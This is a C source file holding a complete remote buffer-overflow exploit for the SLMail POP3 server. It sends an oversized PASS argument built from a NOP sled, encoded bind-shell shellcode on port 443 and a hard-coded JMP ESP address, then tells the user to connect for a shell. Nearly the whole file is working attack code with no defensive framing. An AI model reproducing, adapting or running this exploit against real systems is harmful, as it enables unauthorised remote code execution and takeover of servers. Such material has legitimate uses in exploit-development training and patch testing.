/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
Modified for execution in Linux by SwedishJetson
*/
 
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
 
//[*] bind 443 
unsigned char shellcode[] = 
"\xd9\xd0\xd9\x74\x24\xf4\x5e\x33\xc9\xba\x4c\xec\xb1\x34\xb1"
"\x52\x31\x56\x17\x83\xc6\x04\x03\x1a\xff\x53\xc1\x5e\x17\x11"
"\x2a\x9e\xe8\x76\xa2\x7b\xd9\xb6\xd0\x08\x4a\x07\x92\x5c\x67"
"\xec\xf6\x74\xfc\x80\xde\x7b\xb5\x2f\x39\xb2\x46\x03\x79\xd5"
"\xc4\x5e\xae\x35\xf4\x90\xa3\x34\x31\xcc\x4e\x64\xea\x9a\xfd"
"\x98\x9f\xd7\x3d\x13\xd3\xf6\x45\xc0\xa4\xf9\x64\x57\xbe\xa3"
"\xa6\x56\x13\xd8\xee\x40\x70\xe5\xb9\xfb\x42\x91\x3b\x2d\x9b"
"\x5a\x97\x10\x13\xa9\xe9\x55\x94\x52\x9c\xaf\xe6\xef\xa7\x74"
"\x94\x2b\x2d\x6e\x3e\xbf\x95\x4a\xbe\x6c\x43\x19\xcc\xd9\x07"
"\x45\xd1\xdc\xc4\xfe\xed\x55\xeb\xd0\x67\x2d\xc8\xf4\x2c\xf5"
"\x71\xad\x88\x58\x8d\xad\x72\x04\x2b\xa6\x9f\x51\x46\xe5\xf7"
"\x96\x6b\x15\x08\xb1\xfc\x66\x3a\x1e\x57\xe0\x76\xd7\x71\xf7"
"\x79\xc2\xc6\x67\x84\xed\x36\xae\x43\xb9\x66\xd8\x62\xc2\xec"
"\x18\x8a\x17\xa2\x48\x24\xc8\x03\x38\x84\xb8\xeb\x52\x0b\xe6"
"\x0c\x5d\xc1\x8f\xa7\xa4\x82\xa5\x3c\xa6\x6b\xd2\x40\xa6\x8a"
"\x99\xcc\x40\xe6\xcd\x98\xdb\x9f\x74\x81\x97\x3e\x78\x1f\xd2"
"\x01\xf2\xac\x23\xcf\xf3\xd9\x37\xb8\xf3\x97\x65\x6f\x0b\x02"
"\x01\xf3\x9e\xc9\xd1\x7a\x83\x45\x86\x2b\x75\x9c\x42\xc6\x2c"
"\x36\x70\x1b\xa8\x71\x30\xc0\x09\x7f\xb9\x85\x36\x5b\xa9\x53"
"\xb6\xe7\x9d\x0b\xe1\xb1\x4b\xea\x5b\x70\x25\xa4\x30\xda\xa1"
"\x31\x7b\xdd\xb7\x3d\x56\xab\x57\x8f\x0f\xea\x68\x20\xd8\xfa"
"\x11\x5c\x78\x04\xc8\xe4\x88\x4f\x50\x4c\x01\x16\x01\xcc\x4c"
"\xa9\xfc\x13\x69\x2a\xf4\xeb\x8e\x32\x7d\xe9\xcb\xf4\x6e\x83"
"\x44\x91\x90\x30\x64\xb0";
 
void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER LinuxViking\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 20);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP 5F4A358F FFE4 JMP ESP
 
      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 443...\n\n");
}
 
int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;
 
    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));
 
    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);
 
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}
 
 
int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
